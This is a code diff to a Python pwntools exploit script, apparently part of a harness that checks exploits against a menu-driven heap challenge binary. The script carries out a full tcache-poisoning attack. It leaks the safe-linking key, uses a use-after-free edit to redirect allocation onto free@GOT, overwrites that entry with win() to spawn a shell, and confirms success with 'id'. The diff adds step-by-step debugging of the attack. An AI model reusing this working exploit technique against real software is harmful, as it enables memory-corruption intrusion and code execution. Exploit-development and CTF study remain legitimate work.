@@ -78,42 +78,35 @@ try:
     choose(io, 4, 0)
     key = u64(io.recv(8).ljust(8, b"\x00"))
     choose(io, 1, 0)                        # re-allocate index 0 (tcache empty, count 0)
-    # Phase B -- poison: free two 0x20 chunks (count 2), overwrite head fd with mangle(free_got),
-    # malloc twice so the 2nd allocation lands on free@GOT, then overwrite free@GOT with win.
-    choose(io, 1, 1)
-    choose(io, 2, 1); choose(io, 2, 0)      # tcache head = 0, count = 2
-    choose(io, 3, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))   # UAF edit: fd(0) = mangle(free_got)
-    choose(io, 1, 2)                        # malloc -> chunk 0
-    choose(io, 1, 3)                        # malloc -> free@GOT  (chunks[3] = &free@GOT)
-    # write ONLY 8 bytes: free@GOT = win. Do NOT pad to 0x20 -- the adjacent GOT slots
-    # (puts/write/system/printf) sit right after free@GOT, and win() itself calls printf and
-    # system, so zero-padding over them would crash win() before it spawns the shell.
-    choose(io, 3, 3, p64(win))                                   # *free@GOT = win (8 bytes only)
-    # DIAG: read chunks[3][:8] back. If it equals win, the arbitrary write DID land on free@GOT
-    # (so any failure is at the free->win jump); if not, the tcache poison did not yield free@GOT.
-    choose(io, 4, 3)
-    wrote = u64(io.recv(8).ljust(8, b"\x00"))
-    choose(io, 2, 2)                        # free(valid chunk) -> calls free@GOT -> win() -> /bin/sh
-    post = b""
+    def drain(t=0.25):                      # EOF-tolerant read: captures any glibc abort text
+        try: return io.recv(timeout=t)
+        except Exception: return b""
+    # Phase B -- poison, instrumented step by step so we see WHERE it dies and WHAT glibc says.
+    stage = "start"; dbg = b""
     try:
-        post = io.recvrepeat(1.5)           # win()'s "[+] win reached" / a crash / the menu again
-    except Exception:
-        pass
-    io.sendline(b"echo BINORACLE_PWNED; id")
-    try:
-        post += io.recvrepeat(1.5)
-    except Exception:
-        pass
-    io.close()
-    ok = b"BINORACLE_PWNED" in post or b"win reached" in post or b"uid=" in post
+        choose(io, 1, 1)                                            # new(1)
+        choose(io, 2, 1); choose(io, 2, 0)                          # free(1); free(0) -> count 2
+        choose(io, 3, 0, p64(key ^ free_got).ljust(0x20, b"\x00"))  # poison fd(0)=mangle(free_got)
+        stage = "poisoned"; dbg += drain()
+        choose(io, 1, 2); stage = "malloc1"; dbg += drain()         # malloc -> chunk 0
+        choose(io, 1, 3); stage = "malloc2"; dbg += drain()         # malloc -> free@GOT
+        choose(io, 3, 3, p64(win)); stage = "wrote_win"; dbg += drain()   # *free@GOT = win (8 bytes)
+        io.sendlineafter(PROMPT, b"2"); io.sendline(b"2")           # free(2) -> free@GOT -> win()
+        stage = "triggered"; dbg += io.recvrepeat(1.5)
+        io.sendline(b"echo BINORACLE_PWNED; id"); dbg += io.recvrepeat(1.5)
+    except Exception as e:
+        dbg += ("[EOF@%s:%r]" % (stage, str(e))).encode()
+    try: io.close()
+    except Exception: pass
+    ok = b"BINORACLE_PWNED" in dbg or b"win reached" in dbg or b"uid=" in dbg
     if ok:
         print("VERIFIED key=%#x free_got=%#x win=%#x" % (key, free_got, win))
     else:
-        tail = post[-260:].decode("latin-1", "replace").replace("\n", " | ")
-        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x wrote_back=%#x post=%r"
-              % (key, free_got, win, wrote, tail))
+        tail = dbg[-320:].decode("latin-1", "replace").replace("\n", " | ")
+        print("NOT_VERIFIED key=%#x free_got=%#x win=%#x stage=%s dbg=%r"
+              % (key, free_got, win, stage, tail))
 except Exception as e:
-    print("ERROR", e)
+    print("ERROR", repr(str(e)))
     sys.exit(1)
 '''
 
